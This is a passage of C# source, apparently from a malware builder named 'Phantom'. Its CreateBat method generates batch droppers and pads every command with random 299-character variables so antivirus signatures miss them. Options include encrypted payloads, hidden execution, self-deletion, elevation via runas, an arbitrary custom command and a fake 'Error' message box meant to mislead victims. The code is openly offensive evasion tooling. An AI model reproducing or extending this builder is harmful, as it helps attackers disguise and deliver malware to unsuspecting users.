...
namespace Phantom
{
    internal class FileGen
    {
        ...
        internal static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, bool runas, bool customCommand, bool Messagebox, string customCMD, string customMessagebox, PhantomMain.FileType fileType, Random rng)
        {
            // Generate a random variable name
            string RandomSetVarName = Utils.RandomString(299, rng);
            ...
            output.AppendLine(@"%!%@%!%e%!%c%!%h%!%o%!% %!%o%!%f%!%f%!%".Replace(@"!", Utils.RandomString(299, rng)));

            // Generate random variable names
            string randomvarstr_1 = Utils.RandomString(299, rng);
            string randomvarstr_2 = Utils.RandomString(299, rng);
            // Add lines to set a random variable
            output.AppendLine(@"%!%s%!%e%!%t%!%l%!%o%!%c%!%a%!%l%!% %!%e%!%n%!%a%!%b%!%l%!%e%!%d%!%e%!%l%!%a%!%y%!%e%!%d%!%e%!%x%!%p%!%a%!%n%!%s%!%i%!%o%!%n%!%".Replace(@"!", Utils.RandomString(299, rng)));
            ...
            if (customCommand)
            {
                output.AppendLine($"%!%c%!%m%!%d%!%.%!%e%!%x%!%e%!% {customCMD}".Replace(@"!", Utils.RandomString(299, rng)));
            }
            if (Messagebox)
            {
                output.AppendLine($"powershell -command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('{customMessagebox}','Error',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)\"\r\n");
            }
